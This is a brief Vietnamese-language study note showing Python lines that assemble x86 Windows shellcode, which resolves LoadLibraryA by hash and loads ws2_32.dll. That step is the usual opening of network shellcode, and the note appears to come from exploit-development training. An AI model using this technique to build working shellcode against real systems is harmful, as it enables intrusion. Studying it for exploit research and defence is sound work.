## Assembly:
### Tìm hàm
```
code += "push 0xec0e4e8e;" # LoadLibraryA
code += "call dword ptr [ebp + 0x4];" # call find_function
code += "mov [ebp + 0x10], eax;" # save LoadLibraryA
```
### Gọi hàm
```
code += "xor eax, eax;"
code += "mov ax, 0x6c6c;" # ll
code += "push eax;"
code += "mov eax, 0x642e3233;" # 32.d
code += "push eax;"
code += "mov eax, 0x5f327377;" # ws2_
code += "push eax;"
code += "push esp;"            # địa chỉ chuỗi ws2_32.dll
code += "call [ebp + 0x10];"   # Call LoadLibraryA
code += "mov ebx, eax;"        # Thay đổi base adrress
```
